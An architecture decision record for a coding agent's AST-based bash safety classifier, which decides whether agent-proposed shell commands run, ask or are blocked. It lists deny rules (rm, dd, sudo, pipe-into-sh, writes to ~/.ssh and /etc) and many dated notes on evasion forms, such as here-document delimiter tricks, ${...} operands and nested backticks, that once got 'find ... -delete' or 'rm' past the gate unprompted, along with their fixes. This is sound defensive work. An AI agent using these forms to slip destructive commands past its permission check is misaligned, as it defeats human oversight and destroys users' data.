# ADR-0158 — Tree-sitter-bash AUTO-mode safety classifier

- **Status:** Accepted
- **Date:** 2026-06-21
- **Sprint:** WP-0 (TUI v2 overhaul roadmap)
- **Supersedes/relates:** ADR-0157 (the permission posture engine that adds the `auto` mode this
  classifier drives), ADR-0004 (`GuardrailExtension` — the regex first-block-wins floor retained as
  defense in depth). Roadmap: `.omc/specs/tui-v2-overhaul-roadmap.md` (overrides the earlier
  "auto mode = defer" note, which predated the install/soundness proof).
- **Extended by:** ADR-0237 (#204). This ADR answers with one grammar for one dialect; ADR-0237
  makes the RESOLVED shell an input, adds PowerShell and `cmd` classifiers beside this one, and
  keeps this classifier's DENY as a floor under them. Nothing here is retracted — the bash path
  is unchanged except that a known read-only name's ARGUMENTS are now read with the resolved
  dialect's switch syntax, which is what stopped `sort in.txt /o out.txt` from being an ALLOW
  under `cmd`.

## Context

The `auto` permission posture (ADR-0157) needs to decide, without a prompt, whether a shell command
is safe to run, must be blocked, or should fall back to asking. A regex approach (like the
`GuardrailExtension`) is brittle against quoting / subshell / concatenation evasions:
`echo "rm -rf /"` is harmless but a naive regex flags it; `r''m -rf /` is dangerous but a regex
misses it. An AST is structurally more sound.

## Decision

**Adopt tree-sitter-bash now.** Re-verified installable into the project venv
(`tree-sitter==0.25.2` + `tree-sitter-bash==0.25.1`; pins `tree-sitter>=0.25,<0.26`,
`tree-sitter-bash>=0.25,<0.26`) — prebuilt cross-platform wheels (linux/macos/windows), no compiler,
~3.4 MiB, `requires_python>=3.10` covers the project's `>=3.11`. Added to
`packages/aelix-coding-agent/pyproject.toml` `[project].dependencies` (core, not an extra — the gate
must run on every install path).

`builtin/bash_classifier.py` exposes a pure `classify(command) -> Verdict` over the
tree-sitter-bash AST (`Verdict.ALLOW < ASK < DENY`, so `max` picks the worst):

- **worst-of-pipeline traversal** — `command` / `pipeline` / `redirected_statement` / `list` /
  `program` / `subshell` / `compound_statement` / `command_substitution` / `process_substitution`
  bubble up the MAX verdict of their parts; control flow (`if`/`for`/`while`/`case`/function) → ASK.
- **command-name resolution** — `command_name` resolved to a literal: dynamic
  (`$(…)` / `$VAR`) → ASK; concatenation/quote-splice (`r''m`) resolved by stripping quotes;
  `/bin/rm` normalized via `rsplit("/")`; a leading `A=1` assignment is skipped.
- **rules** — DENY set `{rm,dd,mkfs,shred,fdisk,sudo,doas}`; `git` read-only subcommands → ALLOW
  else ASK; a READ_ONLY allowlist → ALLOW; pipe-into-shell at any non-first stage
  (`sh/bash/zsh/dash/ksh/fish`) → DENY; write-redirect to `/etc /dev /boot /sys /usr /bin ~/.ssh
  /root /.git` → DENY else ASK; unknown command → ASK.
  - **Dated note 2026-11-03 (#657, ADR-0288).** The ALLOW tier now READS the
    arguments of `git` and of the read-only names whose arguments can write or
    execute, so the git ALLOW set is narrowed and the leading-`A=1`-is-skipped
    line above is superseded: a `VAR=value` prefix now forces ASK on every
    command (DENY still wins). Every `git -c`/`--config-env` and
    `-C`/`--git-dir`/`--work-tree`/`GIT_DIR` asks (no safe-key list); `git
    config` asks unless it is a read form; `ls-remote`, `--output`/`--ext-diff`
    and branch/tag/remote/reflog mutations ask; `env <cmd>`, `rg --pre`, `uniq
    in out`, `tree -o`, `yq -i`, `file -C` ask. See `_classify_git`,
    `_classify_by_name` and `_classify_arg_sensitive_read_only` in
    `bash_classifier.py`. This is a NARROWING of the ALLOW allowlist, done with
    the full corpus re-run the "Open risks" note below requires.
    Review round 1 (2026-11-04) narrowed it again, with the Codex and verify
    corpora re-run: an assignment written as a statement or made inside an
    expansion asks; `find`/`fd` read static words (`-de\lete` is DENY) and
    `-fprint0` joins the DENY set; and the walk now visits a here-document
    body, a here-string and a redirect target, whose command substitutions run
    (`cat <<EOF` + `$(rm -rf ~)` read as ALLOW before). ADR-0288 has the
    details.
  - **Dated note 2026-11-04 (#677).** The write-redirect set above gained
    `&>>` (append stdout+stderr): it was missing, so `echo … &>> <protected>`
    was ALLOW while `>>` was DENY. `_WRITE_REDIRECT_OPS` / `_READ_REDIRECT_OPS`
    in `bash_classifier.py` now name the whole operator set tree-sitter-bash
    emits; a descriptor-closing `>&-` and a dup `2>&1` open no file.
  - **Dated note 2026-11-04 (#678).** The `/dev` entry in the protected-prefix
    list above refused EVERY write under `/dev`, including `2>/dev/null` and
    `>/dev/null`, which blocked common reads such as `rg foo 2>/dev/null`. A
    write redirect to exactly `/dev/null`, `/dev/stdout` or `/dev/stderr`
    (`_SINK_DEVICES`) is now ALLOW as a redirect — it changes no file — while
    any other `/dev` target stays DENY and the command's own verdict still
    applies (`rm -rf / >/dev/null` is DENY).
  - **Dated note 2026-11-09 (#710).** The #677 note's "a dup `2>&1` open no
    file" was not what the code did: `_redirect_verdict` read the number after
    `>&` as a target path, so `cat a 2>&1`, `git status 2>&1`,
    `ls >/dev/null 2>&1` and `cat a >&2` were ASK and the TUI asked under
    `auto`. The rules now, each pinned by `tests/builtin/test_bash_fd_dup_710.py`
    (shell behaviour measured on macOS bash 3.2, zsh 5.9, dash and ksh and on
    Linux bash 5.2, zsh 5.9, dash 0.5.12 and ksh 93u+m):
    - **A redirect's target is its FIRST word. A word written after it makes
      the command at least ASK, and the command is also judged with those
      words as its arguments, which can raise the verdict to DENY.**
      tree-sitter puts every word after a redirect inside its node —
      `find . 2>&1 -delete -maxdepth 1` is `file_redirect(2 >& 1 -delete
      -maxdepth 1)`, and `find . <<EOF -delete` keeps `-delete` in the
      `heredoc_redirect` — while bash and zsh pass those words to the
      command, and so do dash and ksh except after `&>` (below). `classify`
      also judges an argument view of the source (every redirect blanked
      except the words it passes on; a `$(…)` inside a blanked part kept,
      because it runs) and takes the worse verdict, so
      `find . 2>&1 -delete -maxdepth 1` is DENY like
      `find . -delete -maxdepth 1`. The view only raises: where the command
      with those words is ALLOW, the form still asks (`ls 2>&1 -la`,
      `rg foo 2>/dev/null -n src` and `echo x <&0 y` ask; `ls 2>&1 -la` asked
      before #710 too). tree-sitter's reading of such a line does not always
      match the shells', and a draft that let an ALLOW view lower the verdict
      ran `echo hi &>/dev/null find . -name 'keep*' -delete` (dash, ksh) and
      `test 1 -eq 0>&1 'a[$(touch PWNED)]'` (macOS ksh93) with no dialog in
      a pty TUI under `auto`. The view gets the walk and the #657
      expansion question alike: `test 2>&1 -v 'a[$(cmd)]'` asks like
      `test -v 'a[$(cmd)]'`; an earlier draft walked the view without asking
      that question, and the form, which runs `cmd` in Linux bash 5.2, ran with
      no dialog in a pty TUI under `auto` (with macOS ksh93 and `1 -eq`). The
      view follows bash where tree-sitter hangs a trailing redirect on a whole
      pipeline or list: in `ls | find . 2>&1 -delete` the words belong to
      `find`. A view that does not parse (`{ ls; } 2>&1 x`, which bash
      rejects) asks, and never lowers a DENY. This closes the same hole for a
      read (`find . </dev/null -delete`, `test </dev/null -v 'a[$(cmd)]'`), a
      read dup (`<&0`), a sink (`2>/dev/null … -path /dev/null`) and a close
      (`2>&- -delete`), all ALLOW before #710 — the `</dev/null` `find` deleted
      the files in its directory in a pty TUI under `auto` on `6caaae09`.
      Measured over 24,597 command strings (the classifier tests' at
      `24bcc679` and a hand list), with one of 29 redirects (dups, closes,
      sinks, reads and here-strings, `0>&1`, `0>/dev/null`, `&>/dev/null`,
      `>&-` and `3>&1` among them, and three here-documents) put before each
      argument and before the command name: of 1,808,498 forms none is ALLOW where the
      same command without the redirect asks or is refused, and none is ALLOW
      where `6caaae09` asked or refused it while a redirect holds a word after
      its target. 2,122 forms ask where the command without the redirect is
      refused: 2,115 because the grammar cannot parse the redirect form
      (`rm 2>&- -rf /`), 7 on a line all four shells reject
      (`0<&0 rm -rf /; { ls; } 2>&1 x`). 206 forms refused on `6caaae09` now
      ask: there the last word was read as the target (`tee 2>&1
      /etc/passwd`), while the shells pass it to the command, and the command
      with it asks (`tee /etc/passwd`). Reading the LAST word as the target
      instead (an earlier draft) let a trailing number make
      `find . 2>&1 -delete -maxdepth 1` an allowed dup.
    - **One digit written with no blank before `<` or `>` is the redirect's
      descriptor.** bash, zsh, dash and ksh take it so (`echo a 0>&1 x`
      prints `a x` in all four on macOS and on Linux), but tree-sitter makes
      a `0` there an argument of the command, or its name; the view blanks
      it with the redirect, so `0>&1 mkfs /dev/sda` is DENY (DENY on
      `6caaae09`, where the last word was read as the target, and ASK in an
      earlier draft). **A descriptor of two or more digits is a word the
      command may get:** bash takes `10>&1` as descriptor 10, while zsh,
      dash and ksh take one digit and pass `10` on (measured on both
      systems; `git branch 10>&1` created a branch `10` in them), so it makes
      the command at least ASK, as a word after a target does.
    - **Under the UNKNOWN and POSIX dialects the words after an `&>` or `&>>`
      target are also judged as a command of their own.** dash (macOS and
      Linux) and macOS ksh93u+ read `&>` as `&` and then `>`: the command
      before it runs in the background and the words after the target run as
      the next command (`echo hi &>/dev/null find . -name 'keep*' -delete`
      deleted the files in both; bash, zsh and Linux ksh 93u+m pass the words
      to `echo`). The argument view with that `&` kept is judged as well, so
      the form is DENY like `find . -delete`; in a pty TUI under `auto` it is
      refused with the files kept under `SHELL=/bin/dash` and `/bin/ksh`.
    - **A `>&` / `<&` target is a descriptor copy (ALLOW as a redirect) only
      when its source bytes, from the operator to the end of the shell word,
      are blanks and then ASCII digits.** The word ends at the end of input, a
      blank, one of `;&|()<>`, or the backtick that closes the `` `…` ``
      substitution the redirect is in; the same end decides a bare close and
      a sink below (`` echo `ls 2>&1` ``, `` echo `ls 2>&-` `` and
      `` echo `git rev-parse HEAD 2>/dev/null` `` write no file in any of the
      four shells, macOS and Linux). Any other backtick starts a substitution
      whose output joins the word — `` echo x >&1`echo .txt` `` writes `1.txt`
      in bash and zsh, `` 2>&-`echo 1` `` writes `-1` in zsh — so it asks.
      tree-sitter's `number` also covers `0x1`, `1#x` and `16#ff`, and
      tree-sitter skips `\r`, `\v` and `\f`
      between tokens; bash and zsh write each of those into a file name
      (`echo x >&1\r` creates `1\r`). After `>` or `&>` a number is a file
      name (`echo x >1`). Any other `<&` target is path-checked (ASK, or DENY on
      a protected path); every shell tried rejects that form, so this follows
      the contract rather than closing a live hole.
    - **A bare close (`2>&-`) stays ALLOW; a word glued to it asks** (`2>&-1`:
      zsh writes a file `-1`, bash passes `1` to the command). A sink device is
      ALLOW only with nothing glued to it: `>/dev/null\r` names a new file under
      `/dev` (DENY; created as root on Linux).
    - An operator outside the three sets is ASK.
    - **A here-document delimiter that is not one word asks, and the rest of
      its line is classified** (an adjacent hole, open since this ADR, closed
      with #710). tree-sitter's `heredoc_start` runs on past `;`, `>`, `|` and
      `&&` with no parse error when the end line is written the same way:
      `cat <<A; find . -name 'keep*' -delete` + `b` + `A;` is a start `A;`
      with `find …` as words, and `cat <<A>~/.bashrc` a start `A>~/.bashrc`.
      All four shells end the delimiter at that byte and run the rest of the
      line; the `find` deleted the files with no dialog in a pty TUI under
      `auto` on `6caaae09`. A start that is not plain bytes, quoted runs and
      backslash escapes is now at least ASK, and the rest of its first line is
      re-read after a `:`, so `find … -delete`, `| sh` and the `.bashrc` write
      are DENY; the body stays data. One-word delimiters (`<<EOF`, `<<'EOF'`,
      `<<"EOF"`, `<<-EOF`, `<<\EOF`, `<<'E O F'`) are unchanged. `$` and a
      backtick are not delimiter bytes here: `cat <<A$''` asks, because dash
      ends its body at a line `A$` and runs what follows (measured on macOS
      and Linux).

    Under `-p`, where an ASK runs without a prompt (ADR-0120), an ASK form
    still runs; the DENY forms above are refused there too.
  - **Dated note 2026-11-10 (#742).** **Outside a command or process
    substitution, a here-document body ends, for the verdict, on the line
    bash, zsh, dash and ksh end it on; where that is not the line tree-sitter
    ends it on, the command asks at least and what the shell runs is re-read
    so a DENY in it still counts. Inside a command or process substitution
    tree-sitter parses as one, any here-document asks at least. So does a
    `${…}` operand tree-sitter leaves as text when it holds a backtick,
    `$(`, `$[`, `${`, `<(` or `>(` no backslash escapes, and a backtick
    substitution holding a `'…'`, `$'…'` or comment with a backtick in it,
    or a word with an escaped backtick in it (fix rounds 2 and 3); other
    code tree-sitter leaves as text is not covered.** tree-sitter-bash
    0.25.1 compares body lines
    with the delimiter as written unless it starts with a quote or a backslash
    (`cat <<A''` ends at a line `A''`), and ends any body, `<<EOF` and
    `<<'EOF'` included, at a line holding the delimiter among blanks or before
    `;`, `#…` or `\r` (`EOF `, ` EOF`, `EOF;`). The shells end at the first
    line equal to the delimiter after quote removal, with leading tabs removed
    under `<<-`, and, only when no part of the delimiter is quoted or
    backslash-escaped, with a line ending in an odd number of backslashes
    joined to the next (measured with `<shell> -c` on macOS bash 3.2.57, zsh
    5.9, dash and ksh93u+ 2012-08-01 and in Linux docker bash 5.2.37, zsh 5.9,
    dash and ksh 93u+m/1.0.10, alike on both except for delimiters with bytes
    above ASCII; `.omc/probes/742/impl/`). `cat <<A''` + `x` + `A` +
    `find victim -delete` + `A''` and `cat <<EOF` + `EOF ` + `cat <<'Q'` +
    `EOF` + `find victim -delete` + `Q` were ALLOW on `b160b8f7` and deleted
    `victim` in all eight shells. `_heredoc_end_verdict` looks for each shell
    family's reading of the delimiter word (`$'…'` decoded by bash, zsh and
    ksh93 and kept with its `$` by dash; `$"…"` read as `A` by bash, `$A` by
    zsh and dash and `$"A"` by ksh93; a byte above ASCII or an escape inside
    `$'…'` is unknown and asks) line by line from the body's first line. A
    reading that ends elsewhere makes the verdict at least ASK, and three
    re-reads can raise it: the shell's body as the double-quoted string it
    expands like (unquoted delimiter only), the lines after the shell's end up
    to tree-sitter's end line (they parse inside `$(…)` too), and everything
    after the shell's end.

    **Fix round 1 (2026-11-10): rules that only raise.** The round-1 verify
    and a Codex review found forms the end-line model above misses, so each
    gap is now closed by a rule that can only make the verdict ASK or worse,
    at the cost of asking on some harmless commands:
    - *A here-document in a command or process substitution tree-sitter
      parses as one asks.* Inside
      backticks the eight shells end the substitution at its first unescaped
      backtick, inside a here-document body too, and remove `\⏎` before they
      read the here-document, quoted delimiter or not; macOS bash 3.2.57 does
      both with a `)` inside `$( )`, `<( )` and `>( )` (the verify's R1–R4,
      ALLOW on `61eda564`, each deleted `victim`; measured again on both
      systems, `.omc/probes/742/fix-r1/`). `_substituted_heredocs_verdict`
      makes any here-document inside such a substitution ASK at least, and
      re-reads, as far as the budget pays, the backtick text unescaped or the
      `$( )` text up to bash 3.2's `)` with `\⏎` joined, and, when the shells
      end the substitution early, the source with the substitution replaced
      by one word; so R1–R4 are refused, and inside double quotes, where what
      follows stays in the string, nothing is refused that no shell ran
      (`test_bash_heredoc_end_742.py`, the `_IN_SUBSTITUTION_*` rows). These
      re-reads are a best effort; the ASK is the rule. A backtick
      substitution with no quote in it inside `${…}` is plain text to
      tree-sitter, so this rule never sees a here-document there: the
      round-2 verify's ``echo ${x:-`cat <<EOF`` + `x` + `EOF` +
      `find victim -delete` + `` `} `` deleted `victim` in all nine shells of
      fix round 2 and was ALLOW on `ce3cc695`; fix round 2 covers it.
      `( … )`, `{ … }` and function bodies get no such rule: the shells
      parse them like the rest,
      ksh93's end of `( cat <<EOF` + `hi` + `EOF)` at `EOF)` is tree-sitter's
      too, and of the verify's 108,960 generated here-documents the ALLOW ones
      that deleted `victim` were all in a substitution.
    - *A re-read that stops parsing keeps the statements before.* Codex's
      `cat <<A''` + `x` + `A` + `find victim -delete` + `cat <<Z` + `A''`
      deleted `victim` in all eight shells and was ASK; `_reread_lines` now
      classifies the prefix ending before the first statement or line
      tree-sitter cannot parse (where that is the first one, it drops lines
      from the end until the rest parses), each prefix paid from the budget,
      and it is DENY. A statement before an error on its own line counts too,
      though bash runs no part of a line it cannot parse.
    - *Running out of stack asks where it happens.* A `RecursionError` in a
      re-read reached `classify`'s catch and replaced the DENY the walk had
      already found: the verify's 1,026-byte `cat <<A''` + `x` + `A` + `A''` +
      a 328-level `$(…)` nest and Codex's 103,172-byte `find victim -delete`
      + a 100 KB comment + 150 mismatched here-documents were DENY on
      `80ff2cc2` and ASK on `61eda564`. `_reread`, `_heredoc_end_verdict` and
      `_substituted_heredocs_verdict` now return ASK for that part only, and
      a re-read nested more than 24 deep is not made; both forms are DENY
      again, and prefixing the nest with that here-document no longer moves
      the depth at which it stops being refused (330 on macOS, Python 3.12).
    - *All the work is paid from one budget.* The re-reads, each reading's
      search for its end line and the delimiter word's scan are charged to a
      budget of four passes over the command plus 4 KiB per `classify` call
      (`_REREAD_BUDGET`); work it cannot pay is skipped and leaves the verdict
      at ASK, never lower. Unbounded re-reads grew exponentially (16
      mismatched here-documents parsed 6,632 times the input), and the
      end-line search was quadratic: Codex's `cat <<A''` + `x` + `B` + `ls` +
      `A''` repeated 1,600 times scanned 26.9 MB.

      | `cat <<A''` + `x` + `B` + `ls` + `A''` × N | 400 | 800 | 1,600 | 3,200 |
      |---|---|---|---|---|
      | `80ff2cc2` (ALLOW) | 5 ms | 10 ms | 19 ms | 45 ms |
      | `ac44df68` (ASK) | 42 ms | 161 ms | 605 ms | 2,365 ms |
      | now (ASK) | 10 ms | 11 ms | 20 ms | 41 ms |

      (one run each, macOS, Python 3.12). The ASK floor is the guarantee;
      which hidden line is still refused depends on sizes. An `rm -rf ~`
      hidden the same way after 22 documents like `cat <<A''` + `x` + `A` +
      `ls` + `A''` is refused and after 23 asks; padded with about 900 bytes
      in its own document it asks after 8, with about 4.5 KB after 4
      (measured on `ac44df68` and now). A test pins the four passes: a 5.4 KB
      command with one hidden `find` is refused with them and only asks
      without them.

    **Fix round 2 (2026-11-10): code tree-sitter leaves as text.** The
    round-2 verify found tree-sitter reading code as text in two places
    older than this issue, the same class as the here-documents above. Each
    is now ASK at least, and the text is re-read as the shells read it, so
    a DENY in it counts (`_hidden_code_verdict`, from `_judge`). Measured
    with `<shell> -c`, `x` unset and then `x=abc` in the environment, in
    macOS bash 3.2.57, zsh, dash and ksh93u+ and Linux docker bash 5.2.37,
    zsh, dash, ksh 93u+m and mksh (`.omc/probes/742/fix-r2/`):
    - *A `${…}` operand.* tree-sitter parses an operand that holds a
      backtick substitution with no quote in it as a plain `word`
      (``echo ${x:-`find victim -delete`}``), an operand after `#`, `%`,
      `/`, `^` or `,` as a `regex` whatever it holds
      (`echo ${x#$(find victim -delete)}`), and `'…'` or `$'…'` there as
      literal text, which inside double quotes or an expanded
      here-document body it is not (`echo "${x:-'$(find victim -delete)'}"`).
      Of a grid of 704 forms (22 operators × 8 operand spellings × bare, in
      double quotes, in a here-document body and inside `"$( )"`), 167 were
      ALLOW on `ce3cc695` and `80ff2cc2` and deleted `victim` in at least
      one shell. An operand holding a backtick, `$(`, `$[` or `${` no
      backslash escapes now asks, and is re-read as a double-quoted string
      when the `${…}` is in one or in a here-document body, else as a word.
      None of the 704 is ALLOW where a shell deleted `victim`: of the 438
      that did in some shell, 394 are refused and 44 ask.
    - *A quote or comment inside backticks that holds a backtick.* bash and
      ksh93 end a backtick substitution at the first unescaped backtick
      inside `'…'` and `$'…'` too, and every shell measured does so inside
      a comment; tree-sitter reads the string or comment across it.
      ``echo `echo '`; find victim -delete; echo `'` `` deleted `victim` in
      macOS bash 3.2.57 and ksh93u+ and Linux bash 5.2.37, and
      ``echo `echo hi # x`; find victim -delete; echo `y`` + `` ` `` in all
      nine; both were ALLOW on `ce3cc695`. Such a substitution now asks, and
      what the shells read is re-read as for a here-document in backticks,
      so both are refused.
    - *bash 3.2's `)` is looked for from the first here-document line*, not
      in the start word: `echo $(cat <<'E)'` + `x` + `)` +
      `find victim -delete` + `E)` + `)` deleted `victim` in macOS bash
      3.2.57 only and stays refused; a test now pins this (the round-2
      verify's mutant A19 had turned it into ASK unnoticed).

    **Fix round 3 (2026-11-10): the round-3 verify's measured rules.** The
    round-3 verify found two more forms of the class above, both ALLOW on
    `80ff2cc2` and on `3963bea9`, the round-2 tree
    (`.omc/probes/742/verify-r3/`, `test_bash_heredoc_end_742.py`, the
    fix-round-3 rows):
    - *A `<(…)` or `>(…)` in a `${…}` operand* is a plain word to
      tree-sitter. `echo ${x:-<(find victim -delete)}` deleted `victim` in
      macOS bash 3.2.57 and Linux bash 5.2.37, and so did `${x-…}`,
      `${HOME:+…}`, `${x:?…}`, `${x:->(…)}`, `cat ${x:-…}`, `${x:- <(…) }`
      and the nested `${x:-${y:-<(…)}}`; no other shell measured ran them,
      Alpine bash 5.3.20 included. `<(` and `>(` now count with the
      backtick, `$(`, `$[` and `${`, so these are refused.
    - *A word holding an escaped backtick inside backticks*, which the
      shells unescape into a nested substitution:
      ``echo `echo \`find victim -delete\`` `` deleted `victim` in all nine
      shells and in bash 5.3.20, and so did the `cat`, `ls`, pipe,
      double-nested and ``\${x:-\`…\`}`` variants. Such a substitution
      now asks and is re-read as for a quote holding a backtick, with the
      escaped backtick unescaped, so these are refused.
    - *The walk's cost.* Whether a `${…}` sits in double quotes was found by
      climbing `.parent`, which py-tree-sitter answers by walking down from
      the root, so nested operands cost cubic time with no hidden code in
      them: `echo ${x:-` nested 490 deep took 947 ms on `3963bea9` against
      2 ms on `80ff2cc2`, and eight such chains in one 23.6 KB line 7.6 s
      against 19 ms. The flag is now carried down the walk: 3 ms and 27 ms,
      with the same verdicts (best of three, one run on `3963bea9`, macOS,
      Python 3.12; `.omc/probes/742/finish/`).

    **Accepted cost** — ASK where no shell measured ran anything: a malformed
    end line with a trailing blank or a stray `\r` at the end of the command
    (`cat <<EOF` + `x` + `EOF `), which the shells never end; and any
    here-document inside a command or process substitution tree-sitter
    parses as one, for example
    ``echo `cat <<'EOF'`` + `hi` + ``EOF` `` (all eight shells print `hi`),
    `echo $(cat <<EOF` + `hi` + `EOF` + `)` and `cat <(cat <<EOF` + `hi` +
    `EOF` + `)`, ALLOW on `80ff2cc2`. Some odd delimiters inside a
    substitution are refused where they only asked: of 229 sampled forms that
    went from ASK to DENY, 215 deleted `victim` in a macOS shell and 14 (with
    backslashes in the delimiter, like `<<"EOF\\"`) did not. Fix round 2
    adds, ASK where no shell measured ran anything: any backtick
    substitution in a `${…}` operand that holds no quote
    (``echo ${x:-`pwd`}``, ``echo "${VERSION:-`cat VERSION`}"``), a `${`
    or `$[` tree-sitter left as text (`echo ${path#${HOME}/}`,
    `echo ${x:-$[1+2]}`), and a `'…'` holding `$(` or a backtick in an
    operand outside double quotes, where it quotes
    (`[ 1 = ${x:-'a[$(touch PWNED)]'} ]`); and DENY where no shell measured
    ran it: `'…'` or `$'…'` holding the substitution in a pattern operand
    (after `#`, `%`, `/`, `^` or `,`) inside double quotes or a here-document
    body, where the shells still read the quotes
    (`echo "${x#'$(find victim -delete)'}"`; 48 of the 704 grid forms).
    Fix round 3 adds, ASK where no shell measured ran anything: a nested
    escaped backtick such as ``echo `basename \`pwd\`` `` (the one line of
    the 31,348 corpus, test and realistic strings and the round-3 verify's
    199 lines whose verdict it changes) or ``echo `echo \`date\`` ``, and a
    harmless `<(…)` in an operand (`echo ${x:-<(echo hi)}`).

    **Measured only raising.** Against `b160b8f7` at `ac44df68`: the #710
    sweep (24,668 argv strings from the tests at `b160b8f7` and the hand
    list, 29 redirects before each argument and the name, 1,815,255 forms)
    has no form below `b160b8f7` and none above; of 30,446 command strings
    one changed, `cat <<A$''` + `x` + `A$` + `find victim -delete` (ASK →
    DENY; dash deletes), which also makes the #710 note's "`cat <<A$''`
    asks" DENY when its hidden line is refused; 115 hand and test
    here-documents are otherwise unchanged. In a fuzz of 5,860 random
    here-documents with these end lines none went below `b160b8f7`; of the
    423 that were ALLOW, the 11 where a shell ran a hidden `touch PWNED` now
    ask, the 60 still ALLOW ran it in none of the eight shells, and 352 now
    ask with no effect: 341 the shells never end (they print the rest as the
    body), 10 they end earlier and then run an unknown command, 1 they end
    later. Fix round 1, against `80ff2cc2` (the same classifier): the
    verify's 108,960 generated here-documents (12 wrappers, 31 delimiters,
    both operators) have none below `80ff2cc2`, `ac44df68` or `61eda564`;
    the 4,640 still ALLOW are a subset of the 7,424 the verify ran in the
    eight shells, and none deleted `victim`. The #710 sweep re-run (24,972
    argv strings, 1,909,470 forms, redirects also before and after every
    `[`/`[[`) has none below `80ff2cc2` and no exception caught by
    `classify`; the 30,841 corpus strings and 132 realistic lines, under
    UNKNOWN and POSIX, have none below and none changed from `61eda564`.
    Fix round 2, measured on the #742 commit alone (`d5711a6d` plus this
    round, without #743) against `80ff2cc2` and `d5711a6d`: the #710 sweep
    (25,255 argv strings, 1,928,940 forms) has none below either and no
    exception caught by `classify`; the round-1 verify's 108,960
    here-documents keep every verdict; the round-2 verify's 936-form
    substitution set has none below, 3 harmless ``echo ${x:-`cat <<EOF`` +
    `hi` + `EOF` + `` `} `` forms go from ALLOW to ASK and 3 from ASK to DENY;
    the round-1 verify's 7,560-form `[`/`[[`/`test` grid has none below and 42
    go from ALLOW to ASK, all `${x:-'a[$(touch PWNED)]'}` forms that ran
    nothing in the eight shells; of 31,348 corpus, test and realistic strings
    under UNKNOWN and POSIX the three realistic ``${…:-`…`}`` lines changed
    (ALLOW → ASK) and nothing else. Live, in a pty TUI under `auto` with a
    scripted model, on `ce3cc695` with no dialog and both files deleted, now
    refused with both kept: ``echo ${x:-`rm -f keep1.txt keep2.txt`}`` with
    `SHELL=/bin/zsh` and `/bin/bash`; ``echo `echo '`; find . -name 'keep*'
    -delete; echo `'` `` and the comment form with `rm -f keep1.txt keep2.txt`
    with `/bin/bash`; `echo ${x#$(rm -f keep1.txt keep2.txt)}` and `echo
    "${x:-'$(rm -f keep1.txt keep2.txt)'}"` with `/bin/zsh`. ``echo
    ${HOME:-/tmp} `date '+%F'` `` runs with no dialog on both.
    Fix round 3, on the #742 commit alone (`15b9f044` plus this round)
    against `80ff2cc2` and `15b9f044`, and on `3963bea9` plus this round
    against `3963bea9`: the #710 sweep (25,292 argv strings, 1,930,980
    forms), the 108,960 here-documents, the 7,560-form grid, the 936-form
    substitution set and the 704-form `${…}` grid keep every verdict, with
    no exception caught by `classify`; of the 31,348 corpus, test and
    realistic strings and the round-3 verify's 199 lines, under UNKNOWN and
    POSIX, only ``echo `basename \`pwd\`` `` changed (ALLOW → ASK). Live,
    in a pty TUI under `auto` with a scripted model on `3963bea9` plus this
    round, `echo ${x:-<(rm -f keep1.txt keep2.txt)}` with `SHELL=/bin/bash`
    and ``echo `echo \`rm -f keep1.txt keep2.txt\`` `` with `/bin/bash` and
    `/bin/zsh`, which ran with no dialog and deleted both files on
    `3963bea9` and `80ff2cc2` in the verify's run, are refused with both
    files kept.
    Live, in a pty TUI under `auto` with a scripted model: with
    `SHELL=/bin/zsh` the `A''` form and the `EOF ` form deleted the files with
    no dialog on `b160b8f7` and are refused with the files kept now; R1
    (``echo `cat <<'EOF'`` + `x` + `EO\` + `F` + `find . -name 'keep*'
    -delete` + `EOF` + `` ` ``) with `/bin/zsh` and R2 (the body's own backtick)
    with `/bin/bash` deleted the files with no dialog on `61eda564` and are
    refused with the files kept now; `cat <<'EOF'` + `find . -name 'keep*'
    -delete` + `EOF` runs with no dialog on all three.
- **fail-safe to ASK** — the grammar import is wrapped in a try/except at module load; on
  ImportError / ABI mismatch the parser stays `None` and `classify` returns ASK for every command.
  At call time `root_node.has_error` (malformed/partial input) → ASK, empty command → ASK, any
  traversal exception → ASK. NEVER ALLOW on uncertainty.

`PermissionMode.AUTO` is appended to `CYCLE_ORDER` (the cycle is now 5: default → auto-accept →
plan → yolo → auto → wrap). The AUTO branch in `permission.py` maps ALLOW → no prompt, ASK → the
4-option dialog, DENY → block. The regex `GuardrailExtension` is retained as the first-block-wins
floor — the classifier drives AUTO allow/ask/deny only; it does NOT relax Guardrail.

## Why it beats regex (verified, 25/25 labeled suite)

`echo "rm -rf /"` → ALLOW (quoted string, not a command); `$(echo rm) -rf /` → ASK (dynamic name);
`r''m -rf /` → DENY (concatenation resolves to `rm`); `git status && rm -rf build` → DENY
(worst-of-list); `curl http://x | sh` → DENY (pipe-into-shell); `echo hi > /etc/hosts` → DENY
(protected write); `git status` → ALLOW; unknown command → ASK; `(rm -rf /)` / `{ rm x; }` → DENY.

## Open risks

- **Grammar node-type drift** — `redirected_statement` / `file_redirect` / `concatenation` /
  `command_substitution` / `command_name` are grammar-version-specific. Mitigated by pinning
  `<0.26` + fail-safe-to-ASK on unrecognized structure + the bucket suite running on the pinned
  version in CI.
- **No-wheel platform** — an exotic platform without a prebuilt wheel would attempt an sdist build
  (needs a C compiler). The fail-safe handles the missing-grammar case (→ ASK), so the agent still
  runs without auto-allow and the other four postures are unaffected.
- **Crude literal resolution by design** — `${x}` indirection / brace-glob / `base64|sh`
  constructed at runtime resolve to dynamic → ASK. Do NOT extend the ALLOW allowlist without
  re-running the full evasion suite.

## Consequences

`auto` mode ships this sprint as an isolated last step; a wheel/grammar problem fails safe to ASK
and cannot block the other four postures. The classifier is pure + dependency-injected (the parser
is the only impure part, built once at import behind a guard), unit-tested without the TUI.
